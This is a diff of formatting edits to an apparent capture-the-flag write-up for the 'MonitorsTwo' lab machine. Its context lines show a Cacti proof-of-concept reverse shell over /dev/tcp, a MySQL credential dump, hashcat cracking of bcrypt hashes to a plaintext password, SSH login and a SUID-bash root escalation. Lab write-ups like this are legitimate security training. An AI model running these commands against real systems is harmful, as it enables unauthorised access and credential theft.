@@ -8,7 +8,7 @@ img_path: /assets/img/monitorstwo
 
 ## NMAP
 
-` nmap -p- -sV -sC 10.10.11.211 `
+`nmap -p- -sV -sC 10.10.11.211`
 
 ```
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 14:22 PDT
@@ -69,11 +69,11 @@ python3 cacti_poc.py http://10.10.11.211/ -c "bash -c 'bash -i >& /dev/tcp/10.10
 
 ![etc/password](Pasted image 20230625152954.png)
 
-Interesting file in / called entrypoint.sh, chmod +x gives us a command that will connect to the mysql server
+Interesting file in `/` called `entrypoint.sh`, chmod +x gives us a command that will connect to the mysql server
 
 ![entrypoint.sh](Pasted image 20230625155852.png)
 
-After connecting to the database we are able to query to see what tables are there, some interesting ones are shown bellow.
+After connecting to the database we are able to query to see what tables are there. Some of the more interesting ones are shown bellow.
 ![msql-query](Pasted image 20230625160618.png)
 
 Using the following msql command we are able to dump all of the table contents from the user_auth table.
@@ -96,15 +96,15 @@ id	username	password	realm	full_name	email_address	must_change_password	password
 
 ```
 
-The logins are emails which gives us the FQDN they are using: ` monitorstwo.htb`
+The logins are emails which gives us the FQDN they are using: `monitorstwo.htb`
 
 ## Password Decryption 
 
 admin	
-` $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC `
+`$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC`
 
 marcus	
-` $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C `
+`$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`
 
 Hashes start with `$2y$`  which is Bcrypt (blowfish)
 
@@ -115,7 +115,7 @@ hashcat -a 0 -m 3200 2mon-hash.txt /usr/share/wordlists/rockyou.txt
 
 One Hash has a hit:
 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:
-` funkymonkey`
+`funkymonkey`
 
 ## User Takeover
 `ssh marcus@10.10.11.211`
@@ -173,6 +173,7 @@ and then set the SUID bit on /bin/bash with `chmod u+s /bin/bash`
 ![rev-shel](Pasted image 20230709171813.png)
 
 ## We have Root!
+
 Re-ran moby-exp.sh:
 ![moby](Pasted image 20230709171918.png)
 
